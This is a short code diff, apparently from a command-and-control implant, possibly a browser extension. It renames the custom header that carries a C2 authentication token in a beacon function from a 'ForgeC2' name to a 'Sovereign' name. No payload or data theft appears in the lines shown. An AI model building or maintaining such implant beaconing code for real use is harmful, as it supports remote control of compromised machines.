@@ -43,7 +43,7 @@ async function getC2Server() {
 function beaconHeaders() {
   const headers = { "Content-Type": "application/json" };
   if (C2_TOKEN && C2_TOKEN.indexOf("<C2_TOKEN>") === -1 && C2_TOKEN.length > 0) {
-    headers["X-ForgeC2-Chrome-Token"] = C2_TOKEN;
+    headers["X-Sovereign-Chrome-Token"] = C2_TOKEN;
   }
   return headers;
 }
